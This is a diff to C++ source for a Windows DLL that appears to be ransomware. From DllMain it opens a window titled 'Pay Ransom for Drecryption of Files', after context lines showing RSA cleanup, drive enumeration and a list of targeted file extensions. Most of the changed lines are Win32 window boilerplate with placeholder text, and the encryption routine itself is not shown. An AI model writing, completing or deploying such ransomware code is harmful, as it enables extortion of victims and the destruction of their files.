@@ -22,35 +22,13 @@
 using namespace std;
 using namespace boost::filesystem;
 
-const int   screenSize_X = 640;
-const int   screenSize_Y = 480;
-
-
 vector<wstring>* get_available_drives();
 set<wstring>* get_wanted_extentions();
 
-//
-//
-// WndProc - Window procedure
-//
-//
-LRESULT
-CALLBACK
-WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
-{
-	switch (uMsg)
-	{
-	case WM_DESTROY:
-		::PostQuitMessage(0);
-		break;
-	default:
-		return ::DefWindowProc(hWnd, uMsg, wParam, lParam);
-	}
 
-	return 0;
-}
+LPWSTR g_szClassName = L"myWindowClass";
 
-
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -152,82 +130,59 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		BIO_free_all(out);
 		rsa.free_all();
 
-		// Show ransom
-		// Setup window class attributes.
-		WNDCLASSEX wcex;
-		ZeroMemory(&wcex, sizeof(wcex));
+		// Ransom window
+		WNDCLASSEX wc;
+		HWND hwnd;
+		MSG Msg;
 
-		wcex.cbSize = sizeof(wcex);	// WNDCLASSEX size in bytes
-		wcex.style = CS_HREDRAW | CS_VREDRAW;		// Window class styles
-		wcex.lpszClassName = TEXT("MYFIRSTWINDOWCLASS");	// Window class name
-		wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);	// Window background brush color.
-		wcex.hCursor = LoadCursor(hModule, IDC_ARROW); // Window cursor
-		wcex.lpfnWndProc = WndProc;		// Window procedure associated to this window class.
-		wcex.hInstance = hModule;	// The application instance.
+		//Step 1: Registering the Window Class
+		wc.cbSize = sizeof(WNDCLASSEX);
+		wc.style = 0;
+		wc.lpfnWndProc = WndProc;
+		wc.cbClsExtra = 0;
+		wc.cbWndExtra = 0;
+		wc.hInstance = hModule;
+		wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+		wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
+		wc.lpszMenuName = NULL;
+		wc.lpszClassName = g_szClassName;
+		wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
 
-									// Register window and ensure registration success.
-		if (!RegisterClassEx(&wcex))
-			return 1;
+		if (!RegisterClassEx(&wc))
+		{
+			MessageBox(NULL, L"Window Registration Failed!", L"Error!",
+				MB_ICONEXCLAMATION | MB_OK);
+			return 0;
+		}
 
-		// Setup window initialization attributes.
-		CREATESTRUCT cs;
-		ZeroMemory(&cs, sizeof(cs));
+		// Step 2: Creating the Window
+		hwnd = CreateWindowEx(
+			WS_EX_CLIENTEDGE,
+			g_szClassName,
+			L"Pay Ransom for Drecryption of Files",
+			WS_OVERLAPPEDWINDOW,
+			CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,
+			NULL, NULL, hModule, NULL);
 
-		cs.x = 0;	// Window X position
-		cs.y = 0;	// Window Y position
-		cs.cx = 640;	// Window width
-		cs.cy = 480;	// Window height
-		cs.hInstance = hModule; // Window instance.
-		cs.lpszClass = wcex.lpszClassName;		// Window class name
-		cs.lpszName = TEXT("Pay Ransom for file decryption");	// Window title
-		cs.style = WS_OVERLAPPEDWINDOW;		// Window style
+		if (hwnd == NULL)
+		{
+			MessageBox(NULL, L"Window Creation Failed!", L"Error!",
+				MB_ICONEXCLAMATION | MB_OK);
+			return 0;
+		}
 
-											// Create the window.
-		HWND hWnd = ::CreateWindowEx(
-			cs.dwExStyle,
-			cs.lpszClass,
-			cs.lpszName,
-			cs.style,
-			cs.x,
-			cs.y,
-			cs.cx,
-			cs.cy,
-			cs.hwndParent,
-			cs.hMenu,
-			cs.hInstance,
-			cs.lpCreateParams);
+		ShowWindow(hwnd, 3);
+		UpdateWindow(hwnd);
 
-		// Validate window.
-		if (!hWnd)
-			return 1;
+		// Step 3: The Message Loop
+		while (GetMessage(&Msg, NULL, 0, 0) > 0)
+		{
+			TranslateMessage(&Msg);
+			DispatchMessage(&Msg);
+		}
+		return Msg.wParam;
 
-		
-
-		// Display the window.
-		::ShowWindow(hWnd, SW_SHOWDEFAULT);
-		::UpdateWindow(hWnd);
-
-		HDC hdc = GetDC(hWnd);
-		RECT rect;
-		GetClientRect(hWnd, &rect);
-		LPCWSTR text = L"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.";
-		
-		DrawText(hdc, text, wcslen(text), &rect, DT_CENTER | DT_VCENTER);
-		ReleaseDC(hWnd, hdc);
-		/*RECT rect;
-		GetClientRect(hWnd, &rect);
-		::RedrawWindow(hWnd, &rect, NULL, RDW_INTERNALPAINT);*/
-
-		// Main message loop.
-		MSG msg;
-		while (::GetMessage(&msg, hWnd, 0, 0) > 0)
-			::DispatchMessage(&msg);
-
-		// Unregister window class, freeing the memory that was
-		// previously allocated for this window.
-		::UnregisterClass(wcex.lpszClassName, hModule);
-
-		return (int)msg.wParam;
 	}
 	case DLL_THREAD_ATTACH:
 	case DLL_THREAD_DETACH:
@@ -303,4 +258,31 @@ set<wstring>* get_wanted_extentions() {
 	extentions->insert(L".iso");*/
 
 	return extentions;
+}
+
+// Step 4: the Window Procedure
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+	switch (msg)
+	{
+	case WM_CLOSE:
+		DestroyWindow(hwnd);
+		break;
+	case WM_DESTROY:
+		PostQuitMessage(0);
+		break;
+	case WM_PAINT: {
+		PAINTSTRUCT ps;
+		HDC hDC = BeginPaint(hwnd, &ps);
+		RECT rect;
+		GetClientRect(hwnd, &rect);
+		wstring text = L"Hello World!This is a hello world application made in the Win32 API This example was made by some random dude, aka -LeetGamer-";
+		text += L"akjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjk";
+		DrawText(hDC, &text[0], text.length(), &rect, DT_WORDBREAK);
+		EndPaint(hwnd, &ps);
+		break;
+	}
+
+	}
+	return DefWindowProc(hwnd, msg, wParam, lParam);
 }
